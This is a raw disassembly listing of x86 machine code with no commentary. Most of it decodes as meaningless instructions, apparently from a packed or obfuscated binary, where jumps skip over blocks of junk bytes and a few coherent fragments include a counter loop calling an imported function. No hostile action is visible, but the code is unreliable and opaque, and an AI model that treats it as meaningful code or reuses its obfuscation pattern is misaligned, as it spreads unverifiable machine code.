  405166:	mov    esp,DWORD PTR [ebp+0x16dc2ad3]
  40516c:	into   
  40516d:	add    al,0x71
  40516f:	and    al,BYTE PTR [esi+0x29]
  405172:	mov    esp,0xb96c3350
  405177:	mov    BYTE PTR [ebx+0x5],dl
  40517a:	nop
  40517b:	mov    ah,0xda
  40517d:	jle    0x405103
  40517f:	xor    ebx,DWORD PTR [edi+0x5148f71e]
  405185:	vcvtss2sd xmm6,xmm6,DWORD PTR [edi+0x7a]
  40518a:	mov    dl,0xde
  40518c:	mov    DWORD PTR ds:0xd899e8a,eax
  405192:	xchg   ah,bh
  405194:	std    
  405195:	pop    eax
  405196:	sbb    eax,0xa0fc6c6f
  40519b:	sub    BYTE PTR [edi+0x47],ah
  40519e:	enter  0x5e4f,0x98
  4051a2:	cli    
  4051a3:	dec    eax
  4051a4:	or     bh,BYTE PTR [ebx+0x45a55d32]
  4051aa:	pop    ss
  4051ab:	adc    BYTE PTR [esi+0xf],0xcf
  4051af:	cli    
  4051b0:	sbb    al,0x8
  4051b2:	retf   
  4051b3:	call   0xf9f8:0x2bc8c8bc
  4051ba:	pop    es
  4051bb:	dec    eax
  4051bc:	pop    ecx
  4051bd:	pxor   mm3,QWORD PTR [eax]
  4051c0:	(bad)  
  4051c1:	ins    BYTE PTR es:[edi],dx
  4051c2:	xchg   dl,al
  4051c4:	push   es
  4051c5:	bound  ebx,QWORD PTR [esp+edi*8-0x70]
  4051c9:	xchg   esp,eax
  4051ca:	push   0xffffffcd
  4051cc:	sbb    ah,BYTE PTR [esi+ebp*2-0x7976e6bd]
  4051d3:	mov    ah,0xe5
  4051d5:	idiv   BYTE PTR [ecx-0x60]
  4051d8:	xchg   esp,eax
  4051d9:	scas   eax,DWORD PTR es:[edi]
  4051da:	xor    DWORD PTR [esi],edx
  4051dc:	daa    
  4051dd:	or     BYTE PTR [ecx-0x925f5f8],dh
  4051e3:	repnz pop ecx
  4051e5:	xchg   ecx,eax
  4051e6:	push   edi
  4051e7:	jecxz  0x4051fe
  4051e9:	or     eax,0xa279b2e6
  4051ee:	xor    DWORD PTR [ebp-0x5a],ebx
  4051f1:	stos   BYTE PTR es:[edi],al
  4051f2:	sbb    DWORD PTR [ecx],ebx
  4051f4:	stos   DWORD PTR es:[edi],eax
  4051f5:	imul   edi,DWORD PTR [ebx+0x65],0x9
  4051f9:	push   0xc5ba0432
  4051fe:	push   esp
  4051ff:	mov    ebp,0xd9159719
  405204:	lea    eax,[eax+edx*1+0x32729a]
  40520b:	mov    DWORD PTR [ebp+0x8],eax
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	jge    0x4052b5
  40523d:	mov    edx,0x7c2ad0af
  405242:	jl     0x4051f9
  405244:	jns    0x4052c2
  405246:	jl     0x405276
  405248:	add    al,0x4
  40524a:	pop    eax
  40524b:	xchg   BYTE PTR [eax+ebx*4-0x12a9a2fa],bh
  405252:	xor    DWORD PTR ds:0x7f940d53,ebp
  405258:	sar    BYTE PTR [edi+0x3df78b46],0xf2
  40525f:	jb     0x405259
  405261:	test   eax,0xfb01efe2
  405266:	xchg   ecx,eax
  405267:	fld    st(0)
  405269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40526a:	sub    esi,esp
  40526c:	push   edx
  40526d:	in     al,0x64
  40526f:	jae    0x405224
  405271:	loopne 0x4052e0
  405273:	pop    edi
  405274:	in     al,0x89
  405276:	js     0x4052f7
  405278:	std    
  405279:	pushf  
  40527a:	sub    ebp,esp
  40527c:	mov    esi,0x2a960047
  405281:	mov    eax,ds:0x5b579750
  405286:	fnsave [ebp+ebx*8-0x34]
  40528a:	repz fbstp TBYTE PTR [eax+0x3d]
  40528e:	mov    eax,0xa35d9839
  405293:	sbb    BYTE PTR [ebx-0x1690e4a2],al
  405299:	dec    ecx
  40529a:	rcl    BYTE PTR [ebx+0x2d],0xd2
  40529e:	fmulp  st(3),st
  4052a0:	inc    ebx
  4052a1:	cwde   
  4052a2:	sub    BYTE PTR ds:0x89991f38,bl
  4052a8:	adc    BYTE PTR ds:0x21a84643,al
  4052ae:	aas    
  4052af:	pop    edx
  4052b0:	pop    edi
  4052b1:	ds das 
  4052b3:	fstp   QWORD PTR [edx-0x7b5d102a]
  4052b9:	dec    ecx
  4052ba:	sbb    al,0xf9
  4052bc:	push   0xffffffac
  4052be:	(bad)  
  4052c0:	push   0x64
  4052c2:	cdq    
  4052c3:	fcom   DWORD PTR [esi+0x2b]
  4052c6:	pop    ds
  4052c7:	test   al,0xfb
  4052c9:	cli    
  4052ca:	inc    ebx
  4052cb:	out    dx,eax
  4052cc:	int3   
  4052cd:	mov    al,ds:0x58949b90
  4052d2:	mov    eax,ds:0x7dcdf27b
  4052d7:	icebp  
  4052d8:	les    ebx,FWORD PTR [ebp-0x3b2f0929]
  4052de:	dec    edx
  4052df:	adc    al,0xc0
  4052e1:	mov    ah,0xde
  4052e3:	push   edx
  4052e4:	push   edx
  4052e5:	cmp    al,0x4
  4052e7:	push   ds
  4052e8:	fs pop ss
  4052ea:	stos   DWORD PTR es:[edi],eax
  4052eb:	(bad)  
  4052ec:	jo     0x405274
  4052ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ef:	pop    es
  4052f0:	shl    DWORD PTR [esi+0xb],cl
  4052f3:	popf   
  4052f4:	test   dl,ah
  4052f6:	xchg   DWORD PTR ds:0x2f5a9c6,esp
  4052fc:	fsubp  st(3),st
  4052fe:	sub    BYTE PTR [ecx+eax*2],0x43
  405302:	rol    BYTE PTR [eax+0xc05b300],0x86
  405309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40530a:	pop    es
  40530b:	test   eax,0x711ee61
  405310:	arpl   ax,dx
  405312:	sub    eax,0x75d16125
  405317:	adc    eax,0xf20f6e6a
  40531c:	(bad)  
  40531d:	sti    
  40531e:	call   0x92915530
  405323:	push   es
  405324:	leave  
  405325:	xor    eax,0x382dc611
  40532a:	mov    ch,0xb2
  40532c:	push   ss
  40532d:	in     eax,0x4a
  40532f:	arpl   WORD PTR [esi-0x1926ceca],dx
  405335:	sub    BYTE PTR [edi+0x3788b421],0x46
  40533c:	scas   al,BYTE PTR es:[edi]
  40533d:	inc    edx
  40533e:	dec    eax
  40533f:	inc    ecx
  405340:	dec    esp
  405341:	pop    edx
  405342:	pop    di
  405344:	daa    
  405345:	mov    esp,0xd2a88eb6
  40534a:	push   esi
  40534b:	pop    ebp
  40534c:	mov    DWORD PTR [eax-0xe032f33],edx
  405352:	lods   eax,DWORD PTR ds:[esi]
  405353:	push   ebp
  405354:	push   eax
  405355:	sub    eax,eax
  405357:	sub    DWORD PTR [ecx],ebx
  405359:	mov    bh,0x58
  40535b:	push   ecx
  40535c:	xchg   esi,eax
  40535d:	lods   al,BYTE PTR ds:[esi]
  40535e:	ins    DWORD PTR es:[edi],dx
  40535f:	mov    eax,ds:0x3639429
  405364:	aaa    
  405365:	push   ebp
  405366:	sahf   
  405367:	or     al,0x46
  405369:	scas   eax,DWORD PTR es:[edi]
  40536a:	icebp  
  40536b:	fwait
  40536c:	loop   0x4052f0
  40536e:	cmp    DWORD PTR [ecx],edi
  405370:	imul   edx,esp,0xf696cf42
  405376:	adc    esp,esi
  405378:	add    eax,DWORD PTR [esi-0x5068e17f]
  40537e:	es xchg ebx,eax
  405380:	fwait
  405381:	fs cld 
  405383:	xor    eax,0xb6c1795c
  405388:	cmp    BYTE PTR [ebp-0x6e],ch
  40538b:	xchg   edx,eax
  40538c:	sahf   
  40538d:	fidivr DWORD PTR [ecx+0x0]
  405390:	out    0x70,al
  405392:	out    dx,eax
  405393:	mov    ebx,0x56f2b8a
  405398:	pop    es
  405399:	xor    al,dh
  40539b:	cmp    cl,cl
  40539d:	loopne 0x405332
  40539f:	push   ebx
  4053a0:	and    al,BYTE PTR [ecx-0x52]
  4053a3:	pop    edx
  4053a4:	popa   
  4053a5:	fs cld 
  4053a7:	sub    eax,0xa47acfa5
  4053ac:	inc    esp
  4053ad:	jne    0x4053de
  4053af:	adc    eax,0x97ee011a
  4053b4:	rol    BYTE PTR [ebp-0x43],cl
  4053b7:	hlt    
  4053b8:	mov    bh,0x1e
  4053ba:	iret   
  4053bb:	jns    0x4053af
  4053bd:	jmp    0x405380
  4053bf:	jb     0x4053c8
  4053c1:	fs int 0x31
  4053c4:	sar    BYTE PTR [ecx],cl
  4053c6:	mov    dl,0xc8
  4053c8:	retf   
  4053c9:	repnz data16 fbld TBYTE PTR [eax+0x31f7ff02]
  4053d1:	jo     0x40544b
  4053d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053d4:	and    eax,0x4a3b66eb
  4053d9:	sub    DWORD PTR [edi-0x20],esi
  4053dc:	add    eax,0xbeb59036
  4053e1:	es aas 
  4053e3:	stos   DWORD PTR es:[edi],eax
  4053e4:	in     eax,0x71
  4053e6:	cmp    DWORD PTR [ebp+ecx*2+0x67],0x9642cc50
  4053ee:	sub    eax,0x2c15ea86
  4053f3:	xor    ch,bl
  4053f5:	mov    cl,0x4a
  4053f7:	add    DWORD PTR [ebp-0x22799a0],eax
  4053fd:	shr    DWORD PTR [ebx-0x1c],cl
  405400:	sbb    bl,BYTE PTR [eax-0x24]
  405403:	adc    al,0x39
  405405:	dec    esi
  405406:	adc    al,BYTE PTR [ecx]
  405408:	xchg   edx,eax
  405409:	jbe    0x40544a
  40540b:	hlt    
  40540c:	cmp    eax,0x923e0151
  405411:	cwde   
  405412:	mov    bh,0x3e
  405414:	dec    esp
  405415:	inc    edi
  405416:	imul   edx,DWORD PTR ds:0x2a34e6a4,0x50
  40541d:	fisttp QWORD PTR [ecx-0x9]
  405420:	sar    bl,0xa7
  405423:	jo     0x4053c0
  405425:	jg     0x40540b
  405427:	mov    bh,0xe7
  405429:	call   0xdbf06a79
  40542e:	inc    ebp
  40542f:	sub    BYTE PTR [edx],dl
  405431:	int3   
  405432:	xchg   BYTE PTR [ebp-0x4],ah
  405435:	push   ecx
  405436:	sbb    eax,0x3b084f02
  40543b:	(bad)  
  40543d:	jae    0x40549c
  40543f:	fisttp DWORD PTR [esi]
  405441:	sub    eax,eax
  405443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405444:	or     edx,0x9fa909f
  40544a:	pop    eax
  40544b:	sub    esi,ebx
  40544d:	cmp    dh,BYTE PTR [eax+0x2f]
  405450:	sbb    BYTE PTR [edx],ah
  405452:	inc    edi
  405453:	in     eax,0xd5
  405455:	pop    esi
  405456:	push   edx
  405457:	jb     0x405454
  405459:	iret   
  40545a:	sbb    eax,0x81861317
  40545f:	fstp   TBYTE PTR [ebp+0x2ddf914c]
  405465:	iret   
  405466:	lock adc BYTE PTR [edx-0x794344a9],ch
  40546d:	pop    esi
  40546e:	cli    
  40546f:	ja     0x405450
  405471:	sub    BYTE PTR [edi-0x6f],dl
  405474:	lock mov fs:0x39e18f51,al
  40547b:	int3   
  40547c:	in     al,dx
  40547d:	inc    ecx
  40547e:	cmp    ah,ch
  405480:	fbstp  TBYTE PTR [ecx+ebp*8-0x1bad2c62]
  405487:	or     dl,al
  405489:	sahf   
  40548a:	push   edx
  40548b:	push   edi
  40548c:	or     dh,ah
  40548e:	push   ss
  40548f:	mov    ebp,0x316d6e5e
  405494:	lods   eax,DWORD PTR ds:[esi]
  405495:	jne    0x405450
  405497:	lahf   
  405498:	push   esp
  405499:	xchg   DWORD PTR [edx],eax
  40549b:	out    0xdc,eax
  40549d:	aaa    
  40549e:	cmc    
  40549f:	sbb    ch,ah
  4054a1:	test   edi,ebx
  4054a3:	mov    al,ds:0x83067067
  4054a8:	mov    ecx,0xc5b96227
  4054ad:	test   eax,0xae9c5d4d
  4054b2:	rcl    DWORD PTR [edx+0x54],0xe8
  4054b6:	push   ecx
  4054b7:	ret    0x1eb2
  4054ba:	std    
  4054bb:	fiadd  WORD PTR [edi+0x486c6293]
  4054c1:	and    al,0x1e
  4054c3:	adc    ebp,DWORD PTR [ebx-0x1c]
  4054c6:	mov    ch,0x3b
  4054c8:	shl    DWORD PTR [edi+0xe73e872],cl
  4054ce:	sbb    al,BYTE PTR [ebx-0x3f]
  4054d1:	inc    edi
  4054d2:	mov    al,0xd0
  4054d4:	loope  0x4054ac
  4054d6:	aam    0x96
  4054d8:	repz push esi
  4054da:	xor    BYTE PTR [esi-0x41f00d],0xa5
  4054e1:	retf   0xb756
  4054e4:	cmc    
  4054e5:	lea    edi,[edi-0x39fdbb12]
  4054eb:	jmp    0x498a4776
  4054f0:	xchg   edx,eax
  4054f1:	add    BYTE PTR [edx+eax*1],ch
  4054f4:	xchg   esi,eax
  4054f5:	sbb    al,0xbe
  4054f7:	push   es
  4054f8:	inc    esp
  4054f9:	ret    0x45ac
  4054fc:	neg    BYTE PTR [ebp-0x4cf2a74e]
  405502:	xchg   DWORD PTR [ebx],ebx
  405504:	pop    ds
  405505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405506:	mov    edx,0x5c840ff2
  40550b:	in     eax,dx
  40550c:	lahf   
  40550d:	mov    esi,0xa14415a6
  405512:	in     al,dx
  405513:	add    ebp,ecx
  405515:	fwait
  405516:	mov    cl,0x1
  405518:	add    DWORD PTR [ecx],edi
  40551a:	push   edi
  40551b:	stos   BYTE PTR es:[edi],al
  40551c:	adc    eax,0x2602089b
  405521:	sti    
  405522:	mov    eax,0x99df389c
  405527:	jns    0x4054c5
  405529:	inc    ecx
  40552a:	dec    esp
  40552b:	call   0x27a12716
  405530:	sti    
  405531:	jb     0x4054bd
  405533:	idiv   DWORD PTR [esi]
  405535:	jge    0x405506
  405537:	neg    DWORD PTR [ebx-0x25c88452]
  40553d:	scas   eax,DWORD PTR es:[edi]
  40553e:	cwde   
  40553f:	jmp    0xa7649ea1
  405544:	aad    0xcb
  405546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405547:	aam    0xfa
  405549:	outs   dx,BYTE PTR ds:[esi]
  40554a:	mov    ecx,ebx
  40554c:	retf   
  40554d:	jl     0x405518
  40554f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405550:	xchg   ecx,eax
  405551:	imul   BYTE PTR [ebx+0x54]
  405554:	not    BYTE PTR [edx]
  405556:	adc    eax,0x498bcef7
  40555b:	(bad)  
  40555c:	jge    0x405595
  40555e:	and    BYTE PTR [ebx+0x1b62a7ce],al
  405564:	cmp    DWORD PTR [eax-0x796ae6bf],ecx
  40556a:	pop    ecx
  40556b:	dec    eax
  40556c:	fiadd  DWORD PTR [edi+0x7c5795b4]
  405572:	jmp    0x4055c4
  405574:	into   
  405575:	sub    al,0x45
  405577:	inc    esp
  405578:	out    dx,eax
  405579:	push   ebp
  40557a:	mov    eax,0xca864692
  40557f:	sbb    edx,ebp
  405581:	pop    ecx
  405582:	add    edx,DWORD PTR [esi+0x2]
  405585:	xchg   BYTE PTR [ebp-0x2e],cl
  405588:	jmp    0x1f42aca4
  40558d:	gs retf 0xa0a4
  405591:	push   0x2d
  405593:	mov    ds:0xcfc5e82c,eax
  405598:	pop    ebp
  405599:	and    ebx,ecx
  40559b:	les    edi,FWORD PTR [esp+ecx*8]
  40559e:	jg     0x405563
  4055a0:	jnp    0x4055b5
  4055a2:	sbb    ah,dl
  4055a4:	pop    eax
  4055a5:	sub    ch,BYTE PTR [esi]
  4055a7:	adc    al,0x7a
  4055a9:	mov    eax,ds:0x355fac37
  4055ae:	ins    DWORD PTR es:[edi],dx
  4055af:	ret    
  4055b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b1:	ja     0x40559a
  4055b3:	bound  esi,QWORD PTR [si+0xe8]
  4055b8:	arpl   WORD PTR [ebp-0x3be8c24c],bx
  4055be:	mov    DWORD PTR [ecx],edi
  4055c0:	or     DWORD PTR [edi+0x469ae14a],eax
  4055c6:	ret    
  4055c7:	pop    edx
  4055c8:	jae    0x4055f9
  4055ca:	lahf   
  4055cb:	cld    
  4055cc:	repz cmp eax,0xc2366dbd
  4055d2:	aaa    
  4055d3:	mov    bh,0xfc
  4055d5:	(bad)  
  4055d6:	or     bh,BYTE PTR ds:0x1e21e4a2
  4055dc:	and    BYTE PTR [esi-0x41],al
  4055df:	test   al,0xda
  4055e1:	sbb    dl,BYTE PTR [eax]
  4055e3:	push   ebx
  4055e4:	push   ds
  4055e5:	retf   
  4055e6:	jle    0x4055bf
  4055e8:	ins    BYTE PTR es:[edi],dx
  4055e9:	fld    DWORD PTR [esi]
  4055eb:	int3   
  4055ec:	push   cs
  4055ed:	imul   ebp,DWORD PTR [ecx],0x40
  4055f0:	jb     0x4055e5
  4055f2:	in     eax,dx
  4055f3:	pop    es
  4055f4:	imul   DWORD PTR [edx-0x5985569b]
  4055fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055fb:	repz inc edi
  4055fd:	iret   
  4055fe:	push   ecx
  4055ff:	push   ecx
  405600:	and    DWORD PTR ds:0x4336e3,0x0
  40560a:	mov    eax,ds:0x4336e3
  40560f:	inc    eax
  405610:	mov    ds:0x4336e3,eax
  405615:	cmp    DWORD PTR ds:0x4336e3,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x4336e3,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x4336e3
  405642:	inc    eax
  405643:	mov    ds:0x4336e3,eax
  405648:	cmp    DWORD PTR ds:0x4336e3,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	aam    0x5c
  405671:	push   ebp
  405672:	sub    eax,0x7c7c3609
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	lahf   
  40567c:	xchg   ebp,eax
  40567d:	je     0x405671
  40567f:	pop    ss
  405680:	cmc    
  405681:	repnz dec ebx
  405683:	hlt    
  405684:	pop    esp
  405685:	sar    DWORD PTR [esi-0x29],1
  405688:	push   esi
  405689:	xchg   edx,eax
  40568a:	xor    BYTE PTR [eax+esi*2],0x55
  40568e:	daa    
  40568f:	out    0xab,eax
  405691:	xlat   BYTE PTR ds:[ebx]
  405692:	ss inc esp
  405694:	(bad)  
  405695:	push   0x9da530e5
  40569a:	or     eax,0xe4f70ac7
  40569f:	push   ecx
  4056a0:	call   FWORD PTR [ebp+0x302a4e40]
  4056a6:	jo     0x4056aa
  4056a8:	ja     0x405661
  4056aa:	push   esi
  4056ab:	loopne 0x40564b
  4056ad:	xor    ecx,DWORD PTR [ebp+0x40]
  4056b0:	cmp    DWORD PTR [edi+0x24da039],edi
  4056b6:	or     ah,BYTE PTR [edi+0x1d9e88a3]
  4056bc:	mov    dl,0x50
  4056be:	jle    0x405703
  4056c0:	aaa    
  4056c1:	add    DWORD PTR [ebx],ebp
  4056c3:	push   ebp
  4056c4:	clc    
  4056c5:	(bad)
  4056c8:	push   ss
  4056c9:	xlat   BYTE PTR ds:[ebx]
  4056ca:	mov    cl,0xc6
  4056cc:	sub    eax,0x7f0a18a7
  4056d1:	fs adc eax,0x1d089435
  4056d7:	cwde   
  4056d8:	enter  0x233e,0x3f
  4056dc:	mov    esp,0x16af1d72
  4056e1:	add    eax,0x95400414
  4056e6:	push   ebp
  4056e7:	loopne 0x4056c1
  4056e9:	adc    ebp,eax
  4056eb:	mov    WORD PTR [eax+0x34],fs
  4056ee:	mov    dh,0xff
  4056f0:	cmp    al,al
  4056f2:	mov    al,ds:0x79577582
  4056f7:	jbe    0x40569b
  4056f9:	push   edx
  4056fa:	mov    bl,0xcd
  4056fc:	popa   
  4056fd:	inc    edi
  4056fe:	adc    edx,ebp
  405700:	leave  
  405701:	mov    esp,0x405f8d63
  405706:	sbb    eax,0x3f2f0c7e
  40570b:	or     BYTE PTR [eax+ecx*4],dl
  40570e:	fstp   TBYTE PTR [ebx-0x628e4f35]
  405714:	test   al,0xaf
  405716:	jl     0x40573a
  405718:	pusha  
  405719:	mov    bl,0x32
  40571b:	dec    esp
  40571c:	push   esi
  40571d:	repnz push cs
  40571f:	addr16 xchg ebx,eax
  405721:	mov    eax,ds:0xcd9f0076
  405726:	sub    esp,edx
  405728:	sahf   
  405729:	fcomp  DWORD PTR [eax]
  40572b:	outs   dx,BYTE PTR ds:[esi]
  40572c:	mov    dl,0x4e
  40572e:	mov    ds,edx
  405730:	pop    edi
  405731:	inc    ebx
  405732:	je     0x4056b7
  405734:	rcl    DWORD PTR [ebx+0x4e],0x91
  405738:	mov    dh,bh
  40573a:	jae    0x4056e5
  40573c:	test   DWORD PTR [edi],esi
  40573e:	(bad)  
  40573f:	int3   
  405740:	jmp    0x95d76158
  405745:	enter  0x434a,0xc7
  405749:	jp     0x4057aa
  40574b:	and    DWORD PTR [esi+ebx*2-0x6a2b6e6f],ebp
  405752:	and    ecx,ebp
  405754:	cwde   
  405755:	mov    ecx,0xa5512561
  40575a:	and    ecx,DWORD PTR [esp+edx*1]
  40575d:	add    eax,0x4a165f89
  405762:	fs cmc 
  405764:	jne    0x40577d
  405766:	adc    eax,0x5a231e9d
  40576b:	mov    ebp,0xe04a5e7a
  405770:	retf   
  405771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405772:	sub    DWORD PTR [ebx+0x3a],eax
  405775:	cmp    esp,0xa716df43
  40577b:	xchg   ecx,eax
  40577c:	dec    esp
  40577d:	jmp    0x40578e
  40577f:	jmp    0x8536e5e
  405784:	mov    ds:0x19e2a260,al
  405789:	inc    esi
  40578a:	cmp    BYTE PTR [esi+eiz*4-0x31],bl
  40578e:	and    edx,edi
  405790:	not    DWORD PTR [edi+0x145005c5]
  405796:	pop    ebx
  405797:	aam    0xff
  405799:	jl     0x4057b3
  40579b:	clc    
  40579c:	dec    esi
  40579d:	add    DWORD PTR [eax-0x46],ebx
  4057a0:	xor    ch,cl
  4057a2:	mov    WORD PTR ds:0x4bf86e41,fs
  4057a8:	xchg   BYTE PTR [ebx+0x643bfa1d],bh
  4057ae:	add    DWORD PTR [ebx-0x29],esi
  4057b1:	dec    edx
  4057b2:	jmp    0xefcd:0x54597fbe
  4057b9:	sbb    BYTE PTR [ecx],0xf7
  4057bc:	iret   
  4057bd:	pop    ebx
  4057be:	sub    BYTE PTR [ecx],0x98
  4057c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c2:	out    0x43,al
  4057c4:	lock jecxz 0x4057ac
  4057c7:	mov    ss,WORD PTR [ebp+0x35]
  4057ca:	retf   
  4057cb:	xchg   edi,eax
  4057cc:	in     eax,dx
  4057cd:	fnstsw WORD PTR [ecx-0x268bbae3]
  4057d3:	xor    ebx,ecx
  4057d5:	out    dx,al
  4057d6:	imul   edx,DWORD PTR ds:0x1647f37c,0x8465e518
  4057e0:	mov    al,0xec
  4057e2:	fnstenv [edx+0x2b]
  4057e5:	repnz les edx,FWORD PTR [ecx+0x1a]
  4057e9:	cs retf 
  4057eb:	aas    
  4057ec:	ret    
  4057ed:	in     al,dx
  4057ee:	sbb    edi,esi
  4057f0:	lods   eax,DWORD PTR ds:[esi]
  4057f1:	cmp    edx,DWORD PTR [ebp-0x7b6785c4]
  4057f7:	imul   DWORD PTR [ecx]
  4057f9:	add    edi,DWORD PTR [ecx-0x3]
  4057fc:	mov    gs,WORD PTR [esi]
  4057fe:	das    
  4057ff:	xchg   edi,eax
  405800:	ret    
  405801:	ins    DWORD PTR es:[edi],dx
  405802:	mov    edx,0x8e466de5
  405807:	(bad)  
  405808:	hlt    
  405809:	cwde   
  40580a:	lds    ebx,FWORD PTR [ebx-0x59]
  40580d:	and    BYTE PTR [ecx],al
  40580f:	cmp    BYTE PTR [ebx-0x31],bh
  405812:	int    0x5
  405814:	mov    dl,0xb3
  405816:	dec    ecx
  405817:	jo     0x405799
  405819:	or     edi,DWORD PTR fs:[edi-0x68f93ff1]
  405820:	push   0x60239c27
  405825:	popf   
  405826:	xor    BYTE PTR [eax+0x45386d5e],dl
  40582c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40582d:	jno    0x40586f
  40582f:	js     0x405826
  405831:	xor    dl,BYTE PTR ds:0xba506b07
  405837:	scas   eax,DWORD PTR es:[edi]
  405838:	add    al,0x41
  40583a:	sar    DWORD PTR [eax+0xa72f242],0xf6
  405841:	jmp    0xd078610b
  405846:	stc    
  405847:	fwait
  405848:	sub    DWORD PTR ds:0x90c9b2e1,0x3
  40584f:	mov    DWORD PTR ds:[edx+0x1da3c1cb],ebp
  405856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405857:	cld    
  405858:	stc    
  405859:	loope  0x40584e
  40585b:	mov    bh,0xc6
  40585d:	mov    dl,BYTE PTR [eax]
  40585f:	or     eax,DWORD PTR [edx-0x7b]
  405862:	arpl   WORD PTR [eax+0x71b1b9d8],cx
  405868:	mov    WORD PTR [ebx+0x60],ds
  40586b:	shl    cl,1
  40586d:	push   esp
  40586e:	mov    ebp,es
  405870:	out    dx,al
  405871:	stos   BYTE PTR es:[edi],al
  405872:	sti    
  405873:	xchg   esi,eax
  405874:	pop    es
  405875:	adc    edi,ebx
  405877:	jmp    0x357f:0x69bf5615
  40587e:	retf   
  40587f:	imul   DWORD PTR [esp+edi*8]
  405882:	mov    edi,0xa85dc14f
  405887:	xchg   ebp,eax
  405888:	sti    
  405889:	in     al,dx
  40588a:	jnp    0x4058c8
  40588c:	pop    esi
  40588d:	xchg   ecx,eax
  40588e:	call   0x7bbd:0x8120cba4
  405895:	ficom  WORD PTR [esi]
  405897:	or     BYTE PTR [ecx-0x13],cl
  40589a:	popf   
  40589b:	rol    WORD PTR [eax-0x6de7ba47],1
  4058a2:	ins    DWORD PTR es:[edi],dx
  4058a3:	jp     0x4058d3
  4058a5:	pop    ebx
  4058a6:	dec    ebx
  4058a7:	add    dl,BYTE PTR [ecx-0x74]
  4058aa:	push   ebp
  4058ab:	dec    ebx
  4058ac:	mov    eax,0x2a277e9f
  4058b1:	jmp    0x405922
  4058b3:	sub    eax,0x47fbc951
  4058b8:	sbb    al,0xd4
  4058ba:	loopne 0x405865
  4058bc:	xor    esp,edi
  4058be:	aam    0x5d
  4058c0:	in     eax,0xa0
  4058c2:	pusha  
  4058c3:	leave  
  4058c4:	int    0xdd
  4058c6:	jp     0x405925
  4058c8:	inc    ebx
  4058c9:	call   0x202cf3cc
  4058ce:	(bad)  
  4058cf:	enter  0xee72,0x5a
  4058d3:	add    eax,0x3f55ad29
  4058d8:	(bad)  
  4058d9:	cli    
  4058da:	arpl   WORD PTR [eax+0x4],bp
  4058dd:	ins    DWORD PTR es:[edi],dx
  4058de:	jbe    0x4058aa
  4058e0:	ins    BYTE PTR es:[edi],dx
  4058e1:	add    eax,0xa64ceca2
  4058e6:	sbb    esi,DWORD PTR [edx-0x1b]
  4058e9:	adc    al,0xf
  4058eb:	or     dl,dh
  4058ed:	test   DWORD PTR ds:0x63550107,ebp
  4058f3:	out    0xaa,eax
  4058f5:	retf   0x8b10
  4058f8:	adc    cl,BYTE PTR [esi+edi*8-0x5faf7b49]
  4058ff:	push   ebx
  405900:	dec    ebx
  405901:	xchg   BYTE PTR [esi],al
  405903:	add    BYTE PTR [ebp+0x30],dl
  405906:	add    DWORD PTR [esi+0xd7a263a],eax
  40590c:	mov    bh,ah
  40590e:	xchg   ecx,eax
  40590f:	(bad)  
  405910:	fucomip st,st(1)
  405912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405913:	sub    DWORD PTR [ebx+0x1ee816aa],ebp
  405919:	aaa    
  40591a:	push   ecx
  40591b:	add    DWORD PTR [edi+0x43ddca0],0xffffffb9
  405922:	push   edi
  405923:	bswap  esi
  405925:	or     esp,DWORD PTR [ebp*8+0x6b703b03]
  40592c:	out    dx,al
  40592d:	push   cs
  40592e:	mov    dh,0x30
  405930:	xlat   BYTE PTR ds:[ebx]
  405931:	mov    esp,0x64c539aa
  405936:	adc    al,BYTE PTR [edx+0x5a]
  405939:	mov    ch,BYTE PTR [ecx]
  40593b:	mov    ebp,0x80460a4a
  405940:	jb     0x4058cd
  405942:	int    0xef
  405944:	mov    ch,BYTE PTR [esi-0x6a]
  405947:	sbb    ebx,esi
  405949:	scas   eax,DWORD PTR es:[edi]
  40594a:	xchg   ebp,eax
  40594b:	or     al,0x85
  40594d:	sbb    ebp,DWORD PTR [ebx]
  40594f:	fistp  DWORD PTR [ebp-0x4f]
  405952:	and    DWORD PTR ss:[ebx+0x4],ecx
  405956:	sub    edi,DWORD PTR [ecx+0x4a]
  405959:	ins    BYTE PTR es:[edi],dx
  40595a:	ins    BYTE PTR es:[edi],dx
  40595b:	inc    esi
  40595c:	jbe    0x405977
  40595e:	inc    ebx
  40595f:	repz and eax,0xc30041d0
  405965:	cmp    al,0x47
  405967:	enter  0x499c,0x2
  40596b:	mov    al,0xc0
  40596d:	or     eax,0xb64485a
  405972:	lahf   
  405973:	mov    ah,0x3a
